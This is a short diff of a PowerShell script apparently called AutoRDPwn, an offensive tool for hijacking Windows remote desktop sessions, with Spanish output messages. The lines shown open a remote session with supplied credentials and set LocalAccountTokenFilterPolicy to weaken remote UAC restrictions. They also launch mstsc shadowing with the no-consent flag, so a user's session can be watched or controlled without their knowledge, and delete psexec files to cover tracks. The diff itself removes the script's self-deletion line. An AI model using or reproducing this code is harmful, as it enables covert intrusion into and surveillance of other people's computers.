@@ -122,7 +122,6 @@ function ConvertFrom-SecureToPlain {
 Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential
-
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
 Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
 Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
@@ -214,6 +213,5 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
     else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
 rm .\psexec.exe, .\PsExec64.exe 2> $null
-rm .\AutoRDPwn.ps1 2> $null
 Write-Host ""
 Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 2500
